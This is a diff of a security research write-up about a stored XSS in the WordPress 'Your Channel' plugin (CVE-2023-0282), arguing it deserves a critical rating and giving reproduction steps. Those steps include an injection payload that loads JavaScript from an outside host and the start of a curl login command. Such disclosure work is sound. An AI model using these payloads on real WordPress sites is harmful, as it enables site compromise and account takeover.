@@ -25,7 +25,11 @@ Vulnerability by design applied on Your Channel's plugin. This will work on any 
 
 This publication is a summary of Touchweb's work studying the impact of XSS vulnerabilities in the context of the Wordpress CMS, following the [Prestashop related publication](https://friends-of-presta.github.io/security-advisories/modules/2023/02/07/stored-xss.html)
 
-To highlight the criticality of XSS and give us the means to mitigate their effects, TouchWeb conducted its research based on the vulnerability of the [Your Channel plugins](https://wpscan.com/vulnerability/93693d45-5217-4571-bae5-aab8878cfe62), which in versions prior to 1.2.2 has a stored XSS, wrongly tag as MEDIUM gravity instead of HIGH gravity : https://nvd.nist.gov/vuln/detail/CVE-2023-0282 like many others XSS T2 F2B (https://wpscan.com/search?text=unauthenticated%20stored&vuln_type=14 / https://wpscan.com/search?text=subscriber%20&vuln_type=14).
+To highlight the criticality of XSS and give us the means to mitigate their effects, TouchWeb conducted its research based on the vulnerability of the [Your Channel plugins](https://wpscan.com/vulnerability/93693d45-5217-4571-bae5-aab8878cfe62), which in versions prior to 1.2.2 has a stored XSS.
+
+It has been wrongly tag as MEDIUM gravity instead of **CRITICAL** gravity : [CVE-2023-0282](https://nvd.nist.gov/vuln/detail/CVE-2023-0282) like many others XSS T2 F2B :
+- [WP-SCAN Unauthenticated Stored XSS](https://wpscan.com/search?text=unauthenticated%20stored&vuln_type=14)
+- [WP-SCAN Subscriber+ Stored XSS](https://wpscan.com/search?text=subscriber%20&vuln_type=14)
 
 ## CVSS base metrics
 
@@ -38,7 +42,7 @@ To highlight the criticality of XSS and give us the means to mitigate their effe
 * **Integrity**: high
 * **Availability**: high
 
-**Vector string**: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H
+**Vector string**: [CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H)
 
 ### How to know if a XSS is critical ?
 
@@ -81,7 +85,7 @@ Touchweb provides two benign JavaScript scripts that highlight the vulnerability
 * We installed Wordpress 6.1.1
 * We installed the [yourchannel plugin zip](https://github.com/WPPlugins/yourchannel/archive/refs/tags/0.9.1.zip).
 * We allow guest on Wordpress to be able to sign up then create an account as guest
-* Login with the account you created as guest and reproduce this POC : https://wpscan.com/vulnerability/93693d45-5217-4571-bae5-aab8878cfe62 by replacing `><script>alert(1)</script>` by `><scrip src=//1j.vc/wp_a.js>`
+* Login with the account you created as guest and reproduce [this POC](https://wpscan.com/vulnerability/93693d45-5217-4571-bae5-aab8878cfe62) :  by replacing `><script>alert(1)</script>` by `><scrip src=//1j.vc/wp_a.js>` or `><scrip src=//1j.vc/wp_b.js>`
 
 ```
 curl -v --cookie-jar cookie.txt  -X POST -d "log=YOUR_SUBSCRIBER_LOGIN&pwd=YOUR_SUBSCRIBER_PASSWORD&wp-submit=Log+In" "https://preprod.XXX/wp-login.php" \
